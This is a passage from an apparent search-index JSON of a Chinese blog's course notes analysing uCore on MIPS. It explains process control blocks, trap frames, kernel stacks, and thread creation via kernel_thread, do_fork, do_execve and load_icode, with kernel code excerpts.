Process ID\n    int runs;                                   // the running times of Proces\n    uintptr_t kstack;                           // Process kernel stack\n    volatile bool need_resched;                 // bool value: need to be rescheduled to release CPU?\n    struct proc_struct *parent;                 // the parent process\n    struct mm_struct *mm;                       // Process's memory management field\n    struct context context;                     // Switch here to run process\n    struct trapframe *tf;                       // Trap frame for current interrupt\n    uintptr_t cr3;                              // CR3 register: the base addr of Page Directroy Table(PDT)\n    uint32_t flags;                             // Process flag\n    char name[PROC_NAME_LEN + 1];               // Process name\n    list_entry_t list_link;                     // Process link list \n    list_entry_t hash_link;                     // Process hash list\n    int exit_code;                              // exit code (be sent to parent proc)\n    uint32_t wait_state;                        // waiting state\n    struct proc_struct *cptr, *yptr, *optr;     // relations between processes\n    struct run_queue *rq;                       // running queue contains Process\n    list_entry_t run_link;                      // the entry linked in run queue\n    int time_slice;                             // time slice for occupying the CPU\n    struct fs_struct *fs_struct;                // the file related info(pwd, files_count, files_array, fs_semaphore) of process\n};\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#tf","title":"tf","text":"<pre><code>struct trapframe {\n uint32_t tf_vaddr; /* coprocessor 0 vaddr register */\n uint32_t tf_status; /* coprocessor 0 status register */\n uint32_t tf_cause; /* coprocessor 0 cause register */\n uint32_t tf_lo;\n uint32_t tf_hi;\n uint32_t tf_ra; /* Saved register 31 */\n  struct pushregs tf_regs;\n uint32_t tf_epc; /* coprocessor 0 epc register */\n};\n</code></pre> <p>tf \u8bb0\u5f55\u4e86</p> <ol> <li>\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff1a32 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u7684\u503c</li> <li>epc, status, cause \u7b49 CP0 \u5bc4\u5b58\u5668</li> </ol> <p>\u8fdb\u5165\u5f02\u5e38\u540e\uff0c\u8981\u5c06 sp \u5207\u6362\u5230\u5185\u6838\u6808\u3002\u5bf9\u4e8e\u5185\u6838\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5c31\u662f\u5f53\u524d\u7684 sp\uff0c\u800c\u5bf9\u4e8e\u7528\u6237\u8fdb\u7a0b\u6765\u8bf4\uff0c\u9700\u8981\u4ece\u8fdb\u7a0b\u63a7\u5236\u5757\u4e2d\u8bfb\u53d6 kstack \u7684\u5730\u5740\u3002</p> <p>uCore \u5185\u6838\u5141\u8bb8\u5d4c\u5957\u4e2d\u65ad\u3002\u56e0\u6b64\u4e3a\u4e86\uf9ba\u4fdd\u8bc1\u5d4c\u5957\u4e2d\u65ad\u53d1\u2f63\u751f\u65f6 tf \u603b\u662f\u80fd\u591f\u6307\u5411\u5f53\u524d\u7684 trapframe\uff0cuCore \u5728\u5185\u6838\u6808\u4e0a\u7ef4\u62a4\u4e86\uf9ba tf \u7684\u94fe\u3002</p> <p>\u53d1\u751f\u4e2d\u65ad\uff08\u5f02\u5e38\uff09\u65f6\uff0ctrap.c::mips_trap \u4f1a\u6539\u53d8\u5f53\u524d\u8fdb\u7a0b current-&gt;tf \u7684\u503c</p> <p><code>current-&gt;tf = *tf*;</code></p> <p>\u8981\u5b9e\u73b0\u5d4c\u5957\u4e2d\u65ad\uff0c\u9700\u8981\u5728\u6539\u53d8 current-&gt;tf \u524d\u4f7f\u7528\u4e00\u4e2a trapframe *otf\uff08\u5c40\u90e8\u53d8\u91cf\uff0c\u5b58\u50a8\u5728\u5185\u6838\u6808\u4e2d\uff09\u5b58\u4e0b\u6765\u3002\u4e4b\u540e\u518d\u5c06 current-&gt;tf \u6062\u590d\u4e3a otf\u3002</p> <p>\u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u5982\u679c\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u53d1\u751f\u4e86\u5f02\u5e38\uff0c\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u53c8\u53d1\u751f\u4e86\u4e00\u6b21\u5f02\u5e38\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21\u5f02\u5e38\u65f6\uff0c\u5df2\u7ecf\u5904\u4e8e\u4e86\u5185\u6838\u6a21\u5f0f\uff08\u5728\u538b\u5165 tf \u540e\uff0c\u8c03\u7528 mips_trap \u4e4b\u524d\uff09\u3002\u5728 ramExcHandle_general \u4e2d\u5c31\u4e0d\u4f1a\u8ba1\u7b97\u65b0\u7684 sp</p> <pre><code>mfc0 k0, CP0_STATUS /* Get status register */\nandi k0, k0, KSU_USER/* Check the we-were-in-user-mode bit */\nbeq k0, $0, 1f  /* If clear, from kernel, already have stack */\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kstack","title":"kstack","text":"<p>\u5185\u6838\u6808\u7528\u4e8e\u5b58\u50a8\u4e2d\u65ad\u5e27 tf \u4ee5\u53ca\u4f5c\u4e3a\u8fdb\u7a0b\u5728\u5185\u6838\u4e2d\u6267\u884c\u4f7f\u7528\u7684 sp</p> <p>\u5bf9\u4e8e\u5185\u6838\u7ebf\u7a0b\uff0c\u8be5\u6808\u5c31\u662f\u8fd0\ufa08\u65f6\u7684\u7a0b\u5e8f\u4f7f\u2f64\u7528\u7684\u6808\u3002\u800c\u5bf9\u4e8e\u666e\u901a\u8fdb\u7a0b\uff0cuCore \u5728\u521b\u5efa\u8fdb\u7a0b\u65f6\u5206\u914d\u4e86\uf9ba 2 \u4e2a\u8fde\u7eed\u7684\u7269\u7406\uf9e4\u2eda\u9875\u4f5c\u4e3a\u5185\u6838\u6808\u7684\u7a7a\u95f4\u3002</p> <p>\u5185\u6838\u6808\u4f4d\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\uff0c\u5e76\u4e14\u662f\u4e0d\uf967\u5171\u4eab\u7684\uff08\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u62e5\u6709\u2f83\u81ea\u2f30\u5df1\u7684\u5185\u6838\u6808\uff09\uff0c\u56e0\u6b64\u4e0d\uf967\u53d7\u5230 mm \u7684\u7ba1\u7406\uf9e4\uff0c\u5f53\u8fdb\u7a0b\u9000\u51fa\u7684\u65f6\u5019\uff0c\u5185\u6838\u80fd\u591f\u6839\u636e kstack \u7684\u503c\u5feb\u901f\u5b9a\u4f4d\u6808\u7684\u4f4d\u7f6e\u5e76\u8fdb\u2f8f\u884c\ufa08\u56de\u6536\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#mm","title":"mm","text":"<p>\u5185\u5b58\u7ba1\u7406\uf9e4\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5185\u5b58\u6620\u5c04\u5217\uf99c\u8868\u3001\u2eda\u9875\u8868\u6307\u9488\u7b49\u3002mm \u6210\u5458\u53d8\u91cf\uf97e\u5728 lab3 \u4e2d\u2f64\u7528\u4e8e\u865a\u5b58\u7ba1\u7406\uf9e4\u3002\u4f46\u5728\u5b9e\u9645 OS \u4e2d\uff0c\u5185\u6838\u7ebf\u7a0b\u5e38\u9a7b\u5185\u5b58\uff0c\u4e0d\uf967\u9700\u8981\u8003\u8651 swap page \u95ee\u9898\uff0c\u5728 lab3 \u4e2d\u6d89\u53ca\u5230\u4e86\uf9ba\u2f64\u7528\u6237\u8fdb\u7a0b\uff0c\u624d\u8003\u8651\u8fdb\u7a0b\u2f64\u7528\u6237\u5185\u5b58\u7a7a\u95f4\u7684 swap page \u95ee\u9898\uff0cmm \u624d\u4f1a\u53d1\u6325\u4f5c\u2f64\u7528\u3002</p> <p>\u8fd8\u6ca1\u770b\u5230\u7528\u6237\u8fdb\u7a0b\u7684 swap page \u4ee3\u7801</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u521b\u5efa\u5185\u6838\u7ebf\u7a0b","title":"\u521b\u5efa\u5185\u6838\u7ebf\u7a0b","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#idle","title":"idle","text":"<p>proc_init \u51fd\u6570\u542f\u52a8\uf9ba\u521b\u5efa\u5185\u6838\u7ebf\u7a0b\u7684\u6b65\u9aa4\u3002\u9996\u5148\u5f53\u524d\u7684\u6267\ufa08\u4e0a\u4e0b\u6587\uff08\u4ece kern_init \u542f\u52a8\u81f3\u4eca\uff09\u5c31\u53ef\u4ee5\u770b\u6210\u662f uCore \u5185\u6838\u4e2d\u7684\u4e00\u4e2a\u5185\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u3002\u4e3a\u6b64\uff0cuCore \u8c03\u7528 alloc_proc \u51fd\u6570\u7ed9\u5f53\u524d\u6267\ufa08\u7684\u4e0a\u4e0b\u6587\u5206\u914d\u4e00\u4e2a\u8fdb\u7a0b\u63a7\u5236\u5757\u5e76\u5728 proc_init \u4e2d\u5bf9\u5b83\u8fdb\ufa08\u76f8\u5e94\u521d\u59cb\u5316\uff0c\u5c06\u5176\u6253\u9020\u6210\u7b2c 0 \u4e2a\u5185\u6838\u7ebf\u7a0b --idleproc\u3002</p> <pre><code>   //alloc_proc\n   proc-&gt;mm = NULL;    //\u4e0d\u9700\u8981\uff0c\u6240\u6709\u5185\u6838\u8fdb\u7a0b\u516c\u7528\u4e00\u4e2a\u9875\u8868\n   proc-&gt;cr3 = boot_cr3;  //\u5728 pmm_init \u4e2d\u5206\u914d\u4e3a PADDR(boot_pgdir)\n\n   //proc_init\n   idleproc-&gt;pid = 0;\n   idleproc-&gt;state = PROC_RUNNABLE;\n   idleproc-&gt;kstack = (uintptr_t)bootstack; //\u5728 entry.S \u4e2d\u8bbe\u7f6e\u7684\n   idleproc-&gt;need_resched = 1; //\u8868\u660e\u5728 kern_init \u540e\u4f1a\u5207\u6362\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#initkernel_thread--do_fork","title":"init(kernel_thread &amp; do_fork)","text":"<p>idle \u5185\u6838\u7ebf\u7a0b\u4e3b\u8981\u5de5\u4f5c\u662f\u5b8c\u6210\u5185\u6838\u4e2d\u5404\u4e2a\u5b50\u7cfb\u7edf\u7684\u521d\u59cb\u5316\uff0cidle \u4f1a\u8c03\u7528 kernel_thread \u51fd\u6570\u521b\u5efa\u5185\u6838\u7ebf\u7a0b init\u3002</p> <p>kernel_thread \u7b80\u5355\u6765\u8bf4\u4e3a\u65b0\u8fdb\u7a0b\u5206\u914d\u4e86 PCB \u7a7a\u95f4\uff0c\u548c kstack \u7a7a\u95f4\u3002</p> <pre><code>  //proc_init\n int pid = kernel_thread(init_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create init_main failed.\\n\");\n    }\n    initproc = find_proc(pid);\n    set_proc_name(initproc, \"init\");\n</code></pre> <p>\u8fc7\u7a0b\uff1a</p> <ol> <li> <p>kernel_thread \u521b\u5efa\u5185\u6838\u7ebf\u7a0b\u7684\u4e2d\u65ad\u5e27\uff0c\u91cd\u70b9\u5728\u4e8e\u5c06 epc \u8bbe\u7f6e\u4e3a\u4e86 kernel_thread_entry\uff0c\u4ee5\u53ca\u8bbe\u7f6e a0 \u548c a1 \u4e3a arg \u548c fn\u3002\u8fd8\u6709\u4e00\u70b9\u503c\u5f97\u6ce8\u610f\uff0cstatus \u7684 KSU \u4e3a\u5185\u6838\u6a21\u5f0f\u3002</p> <p>\u5f53\u4ece eret \u8fd4\u56de\u540e\uff08forkrets -&gt; exception_return\uff09\uff0cCPU \u4fbf\u4f1a\u8fdb\u5165 kernel_thread_entry\uff0c\u5e76\u4ee5 tf \u4e2d\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u503c\u6267\u884c\u3002</p> <p>kernel_thread \u51fd\u6570\u91c7\u7528\uf9ba\u5c40\u90e8\u53d8\uf97e tf \u6765\u653e\u7f6e\u4e2d\u65ad\u5e27\uff0c\u5e76\u628a\u4e2d\u65ad\u5e27\u7684\u6307\u9488\u4f20\u9012\u7ed9 do_fork \u51fd\u6570\u3002</p> <p>kernel_thread \u8c03\u7528 do_fork \u7684 stack \u53c2\u6570\u4e3a 0\u3002\u5728 do_fork-&gt;copy_thread \u4ee5\u6b64\u6765\u5224\u65ad\u662f\u521b\u5efa\u5185\u6838\u7ebf\u7a0b</p> </li> <li> <p>do_fork \u4f5c\u7528\u662f\u4ee5\u5f53\u524d\u8fdb\u7a0b\u4e3a\u7236\u8fdb\u7a0b\uff0c\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u6839\u636e clone_flags \u51b3\u5b9a\u662f\u5426\u5171\u4eab mm\u3002\u5177\u4f53\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u4e00\u4e9b\u4e8b\u60c5\uff1a</p> <ol> <li> <p>\u8c03\u7528 alloc_proc \u4e3a\u5b50\u8fdb\u7a0b\u5206\u914d PCB \u7a7a\u95f4</p> </li> <li> <p>\u8c03\u7528 setup_kstack(proc)\u5206\u914d\u4e86\u5185\u6838\u6808\u7a7a\u95f4\uff08\u6ce8\u610f\u8fd9\u91cc\u7684 kstack \u4e3a\u7a7a\u95f2\u9875\u7684\u8d77\u59cb\u5730\u5740\uff0c\u800c\u975e\u6808\u9876\uff09</p> </li> <li> <p>\u8c03\u7528 copy_mm\uff0c\u6839\u636e clone_flags \u6765\u786e\u5b9a\u662f\u590d\u5236\u8fd8\u662f\u5171\u4eab mm\u3002\uff08\u53ea\u5bf9\u7528\u6237\u8fdb\u7a0b\u6709\u6548\uff0c\u5185\u6838\u7ebf\u7a0b mm \u90fd\u4e3a NULL\uff09</p> </li> <li> <p>\u8c03\u7528 copy_thread\uff1a\u5c06 tf \u62f7\u8d1d\u5230 kstack \u7684\u6808\u9876\uff0c\u8bbe\u7f6e tf \u4e2d\u7684 sp \u4e3a proc-&gt;tf - 32\uff08\u8fd9\u91cc\u7684\u51cf 32 \u5e94\u8be5\u548c\u4e4b\u524d\u63d0\u5230\u7684 MIPS \u51fd\u6570\u8c03\u7528\u89c4\u5219\u6709\u5173\uff0c\u4e0d\u7ba1\u600e\u6837\uff0csp \u662f\u4f4d\u4e8e kstack \u4e2d\u7684\uff09</p> <p>\u5c06 context \u4e2d\u7684 ra \u8bbe\u7f6e\u4e3a forkret</p> </li> <li> <p>\u5c06\u5b50\u8fdb\u7a0b\u63d2\u5165 hash_list \u548c proc_list</p> </li> <li> <p>\u8c03\u7528 wakeup_proc \u5c06\u8fdb\u7a0b\u52a0\u5165\u8c03\u5ea6\u961f\u5217</p> </li> </ol> </li> </ol> <pre><code>int\nkernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags) {\n    struct trapframe tf;\n    memset(&amp;tf, 0, sizeof(struct trapframe));\n    tf.tf_regs.reg_r[MIPS_REG_A0] = (uint32_t)arg;\n    tf.tf_regs.reg_r[MIPS_REG_A1] = (uint32_t)fn;\n    tf.tf_regs.reg_r[MIPS_REG_V0] = 0;\n    //TODO\n    tf.tf_status = read_c0_status();\n    tf.tf_status &amp;= ~ST0_KSU;\n    tf.tf_status |= ST0_IE;\n    tf.tf_status |= ST0_EXL;\n    tf.tf_regs.reg_r[MIPS_REG_GP] = __read_reg($28);\n    tf.tf_epc = (uint32_t)kernel_thread_entry;\n    return do_fork(clone_flags | CLONE_VM, 0, &amp;tf);\n}\n\n//kern/proc/entry.S\nkernel_thread_entry:        # void kernel_thread(void)\n  addiu $sp, $sp, -16\n  jal $a1\n  nop\n  move $a0, $v0\n  la  $t0, do_exit\n  jal $t0 \n  nop\n  /* never here */\n\n//called by do_fork\nstatic void\ncopy_thread(struct proc_struct *proc, uintptr_t esp, struct trapframe *tf) {\n    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1;\n    *(proc-&gt;tf) = *tf;\n    proc-&gt;tf-&gt;tf_regs.reg_r[MIPS_REG_V0] = 0;\n    if(esp == 0) //a kernel thread\n      esp = (uintptr_t)proc-&gt;tf - 32;\n    proc-&gt;tf-&gt;tf_regs.reg_r[MIPS_REG_SP] = esp;\n    proc-&gt;context.sf_ra = (uintptr_t)forkret;\n    proc-&gt;context.sf_sp = (uintptr_t)(proc-&gt;tf) - 32;\n}\n\n// do_fork - parent process for a new child process\n//    1. call alloc_proc to allocate a proc_struct\n//    2. call setup_kstack to allocate a kernel stack for child process\n//    3. call copy_mm to dup OR share mm according clone_flag\n//    4. call copy_thread to setup tf &amp; context in proc_struct\n//    5. insert proc_struct into hash_list &amp;&amp; proc_list\n//    6. call wakup_proc to make the new child process RUNNABLE \n//    7. set the \nint\ndo_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf) {\n int ret = -E_NO_FREE_PROC;\n struct proc_struct *proc;\n if (nr_process &gt;= MAX_PROCESS) {\n     goto fork_out;\n }\n ret = -E_NO_MEM;\n //LAB4:EXERCISE2 2009010989\n if ((proc = alloc_proc()) == NULL) {\n     goto fork_out;\n }\n\n proc-&gt;parent = current;\n\n if(setup_kstack(proc)){\n     goto bad_fork_cleanup_proc;\n }\n //LAB8:EXERCISE2 2009010989 HINT:how to copy the fs in parent's proc_struct?\n if (copy_fs(clone_flags, proc) != 0) {\n     goto bad_fork_cleanup_kstack;\n }\n if (copy_mm(clone_flags, proc)){\n     goto bad_fork_cleanup_fs;\n }\n\n copy_thread(proc, (uint32_t)stack, tf);\n\n proc-&gt;pid = get_pid();\n hash_proc(proc);\n\n\n //list_add(&amp;proc_list, &amp;(proc-&gt;list_link));\n set_links(proc);\n\n wakeup_proc(proc);\n\n ret = proc-&gt;pid;\n\nfork_out:\n return ret;\n\nbad_fork_cleanup_fs:\n put_fs(proc);\nbad_fork_cleanup_kstack:\n put_kstack(proc);\nbad_fork_cleanup_proc:\n kfree(proc);\n goto fork_out;\n}\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#user_main","title":"user_main","text":"<p>\u5728 init_main \u4e2d\uff0c\u521b\u5efa\u4e86 user_main \u7ebf\u7a0b\u3002</p> <pre><code>// init_main - the second kernel thread used to create user_main kernel threads\nstatic int\ninit_main(void *arg) {\n ...\n    int pid = kernel_thread(user_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create user_main failed.\\n\");\n    }\n\n    while (do_wait(0, NULL) == 0) {\n        schedule();\n    }\n\n    fs_cleanup();\n    kprintf(\"all user-mode processes have quit.\\n\");\n    ...\n}\n</code></pre> <p>kernel_thread \u4e4b\u524d\u5df2\u7ecf\u5206\u6790\u8fc7\u4e86\uff0c\u6211\u4eec\u6765\u770b user_main \u505a\u4e86\u4ec0\u4e48</p> <pre><code>// user_main - kernel thread used to exec a user program\nstatic int\nuser_main(void *arg) {\n    kprintf(\"in user main, pid: %d\\n\", current-&gt;pid);\n    KERNEL_EXECVE(sh);\n    panic(\"user_main execve failed.\\n\");\n}\n</code></pre> <p>user_main \u8c03\u7528\u4e86<code>KERNEL_EXECVE</code>\u6765\u52a0\u8f7d\u6267\u884c\u4e00\u4e2a\u7528\u6237\u7a0b\u5e8f\u3002<code>KERNEL_EXECVE</code>\u88ab\u5c55\u5f00\u4e3a\u5bf9 kernel_execve \u7684\u8c03\u7528\u3002</p> <pre><code>// kernel_execve - do SYS_exec syscall to exec a user program called by user_main kernel_thread\nstatic int\nkernel_execve(const char *name, const char **argv) {\n    int argc = 0, ret;\n    while (argv[argc] != NULL) {\n        argc ++;\n    }\n    //panic(\"unimpl\");\n    asm volatile(\n      \"la $v0, %1;\\n\" /* syscall no. */\n      \"move $a0, %2;\\n\"\n      \"move $a1, %3;\\n\"\n      \"move $a2, %4;\\n\"\n      \"move $a3, %5;\\n\"\n      \"syscall;\\n\"\n      \"nop;\\n\"\n      \"move %0, $v0;\\n\"\n      : \"=r\"(ret)\n      : \"i\"(SYSCALL_BASE+SYS_exec), \"r\"(name), \"r\"(argc), \"r\"(argv), \"r\"(argc) \n      : \"a0\", \"a1\", \"a2\", \"a3\", \"v0\"\n    );\n    return ret;\n}\n</code></pre> <p>\u800c kernel_execve \u5219\u662f\u8fdb\u884c\u4e86\u4e00\u6b21\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>kernel_execve -&gt; SYSCALL -&gt; sys_exec -&gt; do_execve</p> <ol> <li> <p>\u56e0\u4e3a kernel_execve \u5c31\u662f\u5728\u5185\u6838\u7ebf\u7a0b\uff0c\u6240\u4ee5\u4e4b\u540e\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4ecd\u7136\u662f\u4f7f\u7528\u4e00\u6837\u7684\u5185\u6838\u6808\u3002</p> </li> <li> <p>do_execve \u505a\u7684\u4e8b\u60c5</p> <pre><code>int do_execve(const char *name, int argc, const char **argv) \n</code></pre> <ol> <li> <p>\u521b\u5efa\u5c40\u90e8\u53d8\u91cf local_name, kargv\uff08\u4f4d\u4e8e\u4e0a\u4e0b\u6587\u7684\u5185\u6838\u6808\u4e2d\uff09\uff0c\u5c06\u53c2\u6570 name, argv \u590d\u5236\u8fc7\u6765\u3002</p> <p>kernel_execve \u8c03\u7528\u65f6\u4f20\u9012\u4e86\"sh\"\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u5730\u5740\u3002\u800c\u8be5\"sh\"\u7684\u5730\u5740\u5728 gdb \u8c03\u8bd5\u65f6\u663e\u793a\u4e3a 0x8002_7ff0\uff0c\u800c local_name \u7684\u5730\u5740\u5219\u4e3a 0x81fe_bd20\uff08\u6b64\u65f6 sp \u4e3a 0x81fe_bd00\uff0c\u53ef\u4ee5\u77e5\u9053 local_name \u4f4d\u4e8e\u5f53\u524d\u51fd\u6570\u7684\u6808\u5e27\u4e2d\uff0c\u800c\"sh\"\u4f4d\u4e8e\u522b\u5904\uff09</p> <pre><code>copy_string(mm, local_name, name, sizeof(local_name))\n\ncopy_kargv(mm, argc, kargv, argv)\n</code></pre> <p>copy_string \u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5148\u68c0\u67e5\u8bbf\u95ee src \u662f\u5426\u5408\u6cd5\uff08\u901a\u8fc7 mm\uff09\uff0c\u7136\u540e\u5c06 src \u590d\u5236\u5230 dst \u4e2d\u3002\u8fd9\u91cc\u7684 dst \u4f4d\u4e8e\u5185\u6838\u7a7a\u95f4</p> <pre><code>bool copy_string(struct mm_struct *mm, char *dst, const char *src, size_t maxn) \n</code></pre> <p>copy_string \u5177\u4f53\u4ee3\u7801\uff0cif \u5224\u65ad\u6709\u70b9\u590d\u6742\uff0c\u4e14\u6ca1\u6709\u6ce8\u91ca\uff0c\u6ca1\u592a\u770b\u61c2\u3002</p> </li> <li> <p>\u8bfb\u53d6\u6587\u4ef6\u7cfb\u7edf\uff0c\u83b7\u5f97\u6587\u4ef6\u53f7\uff0c\u4e4b\u540e\u4f20\u7ed9 load_icode \u4f7f\u7528\u3002</p> <pre><code>fd = sysfile_open(path, O_RDONLY)\n</code></pre> </li> <li> <p>\u6e05\u7a7a\u539f\u672c\u7684 mm\u3002vma\uff0c\u5206\u914d\u7684 Page\uff0c\u9875\u8868\u7b49\u7b49\u90fd\u4f1a\u88ab\u6e05\u9664\u3002(user \u6b64\u65f6\u662f\u5185\u6838\u8fdb\u7a0b\uff0c\u56e0\u6b64\u6ca1\u6709 mm)</p> <pre><code> if (mm != NULL) {\n        lcr3(boot_cr3);\n        if (mm_count_dec(mm) == 0) {\n            exit_mmap(mm);\n            put_pgdir(mm);\n            mm_destroy(mm);\n        }\n        current-&gt;mm = NULL;\n    }\n</code></pre> </li> <li> <p>\u8c03\u7528 load_icode</p> <pre><code>load_icode(fd, argc, kargv)\n</code></pre> <p>\u8c03\u7528\u5b8c load_icode \u540e\uff0celf \u6587\u4ef6\u5df2\u7ecf\u88ab\u5168\u90e8\u52a0\u8f7d\u8fdb\u5185\u5b58\uff0c\u5e76\u4e14\u6839\u636e elf \u6587\u4ef6 program header \u7684\u5185\u5bb9\u8bbe\u7f6e\u597d\u4e86 vma\uff0c\u9875\u8868\u7b49\u5185\u5bb9\u3002\u8fd8\u5206\u914d\u4e86 USTACK \u7a7a\u95f4\u3002</p> </li> </ol> </li> <li> <p>load_icode \u505a\u7684\u4e8b\u60c5</p> <pre><code>// load_icode -  called by sys_exec--&gt;do_execve\n// 1. create a new mm for current process\n// 2. create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT\n// 3. copy TEXT/DATA/BSS parts in binary to memory space of process\n// 4. call mm_map to setup user stack, and put parameters into user stack\n// 5. setup trapframe for user environment \nstatic int\nload_icode(int fd, int argc, char **kargv)\n</code></pre> <ol> <li> <p>\u521b\u5efa\u65b0\u7684 mm</p> <pre><code> struct mm_struct *mm;\n    if ((mm = mm_create()) == NULL) {\n        goto bad_mm;\n    }\n    if (setup_pgdir(mm) != 0) {\n        goto bad_pgdir_cleanup_mm;\n    }\n</code></pre> </li> <li> <p>\u63a5\u4e0b\u6765\u6d89\u53ca\u5230\u5bf9 elf \u6587\u4ef6\u7684\u89e3\u6790\u3002\u9996\u5148\u8c03\u7528 load_icode_read \u8bfb\u53d6 elf \u5934 (struct elfhdr32)\u3002\u7136\u540e\u6839\u636e elfhdr\uff0c\u83b7\u5f97\u7a0b\u5e8f\u5934 (struct proghdr) \u7684\u6587\u4ef6\u5185\u504f\u79fb elf-&gt;e_phoff\u3001\u7a0b\u5e8f\u5934\u7684\u6570\u91cf elf-&gt;e_phnum\u3002\u518d\u901a\u8fc7 for \u5faa\u73af\uff0c\u8bfb\u53d6\u6bcf\u4e2a\u7a0b\u5e8f\u5934 ph\u3002\u7a0b\u5e8f\u5934\u663e\u793a\u4e86\u6bcf\u4e2a\u6bb5\u7684\u4fe1\u606f\u3002</p> <pre><code>for (phnum = 0; phnum &lt; elf-&gt;e_phnum; phnum ++) {\n    off_t phoff = elf-&gt;e_phoff + sizeof(struct proghdr) * phnum;\n    if ((ret = load_icode_read(fd, ph, sizeof(struct proghdr), phoff)) != 0) {\n        goto bad_cleanup_mmap;\n }\n    ...\n</code></pre> <p>readelf -l  obj/user/sh\u7684\u4fe1\u606f</p> <pre><code>Elf \u6587\u4ef6\u7c7b\u578b\u4e3a EXEC (\u53ef\u6267\u884c\u6587\u4ef6)\nEntry point 0x100033d0\nThere are 2 program headers, starting at offset 52\n\n\u7a0b\u5e8f\u5934\uff1a\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  ABIFLAGS       0x0141d0 0x100041d0 0x100041d0 0x00018 0x00018 R   0x8\n  LOAD           0x010000 0x10000000 0x10000000 0x05010 0x09010 RWE 0x10000\n\n Section to Segment mapping:\n  \u6bb5\u8282...\n   00     .MIPS.abiflags \n   01     .text .MIPS.abiflags .data .bss\n</code></pre> </li> <li> <p>\u6839\u636e\u6bcf\u4e2a ph \u7684\u4fe1\u606f\uff0c\u6dfb\u52a0 vma\u3002\u8fd9\u91cc\u7528\u7684\u662f ph-&gt;p_memsz\u3002</p> <pre><code> vm_flags = 0;\n      //ptep_set_u_read(&amp;perm);\n    perm |= PTE_U;\n    if (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;\n    if (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;\n    if (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;\n    if (vm_flags &amp; VM_WRITE) perm |= PTE_W; \n\n    if ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, NULL)) != 0) {\n        goto bad_cleanup_mmap;\n    }\n</code></pre> </li> <li> <p>\u8c03\u7528 pgdir_alloc_page \u4e3a\u6bcf\u4e2a\u865a\u62df\u5730\u5740\u5206\u914d\u7269\u7406\u9875\uff0c\u5e76\u6dfb\u52a0\u9875\u8868\u6620\u5c04\u3002\u8c03\u7528 load_icode_read \u5c06 elf \u6587\u4ef6\u5bf9\u5e94\u6bb5 (segment) \u8bfb\u53d6\u5230\u5bf9\u5e94\u7684\u7269\u7406\u9875\u4e2d\u3002</p> <pre><code>    off_t offset = ph-&gt;p_offset;\n    size_t off, size;\n    uintptr_t start = ph-&gt;p_va, end, la = ROUNDDOWN_2N(start, PGSHIFT);\n\n    end = ph-&gt;p_va + ph-&gt;p_filesz;\n    while (start &lt; end) {\n        if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {\n            ret = -E_NO_MEM;\n            goto bad_cleanup_mmap;\n        }\n        off = start - la, size = PGSIZE - off, la += PGSIZE;\n        if (end &lt; la) {\n            size -= la - end;\n        }\n        if ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != 0) {\n            goto bad_cleanup_mmap;\n        }\n        start += size, offset += size;\n    }\n</code></pre> </li> <li> <p>\u8bbe\u7f6e bss \u6bb5\uff08\u731c\u6d4b\uff09</p> <pre><code> end = ph-&gt;p_va + ph-&gt;p_memsz;\n\n    if (start &lt; la) {\n        if (start &gt;= end) {\n            